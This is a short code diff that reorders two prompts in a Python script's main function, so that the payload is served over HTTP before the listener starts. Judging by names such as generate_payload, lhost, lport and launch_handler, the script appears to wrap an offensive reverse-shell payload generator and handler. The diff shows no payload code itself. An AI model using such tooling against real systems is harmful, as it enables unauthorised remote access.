@@ -13,11 +13,11 @@ def main():
     payload, outformat = generate_payload(platform, lhost, lport, outfile)
     handler_file = create_handler(payload, lhost, lport, outfile)
 
-    if input("Start handler? (y/n): ").lower() == "y":
-        launch_handler(handler_file)
-
     if input("Host payload via HTTP? (y/n): ").lower() == "y":
         host_payload(outfile, outformat)
 
+    if input("Start handler? (y/n): ").lower() == "y":
+        launch_handler(handler_file)
+        
 if __name__ == "__main__":
     main()
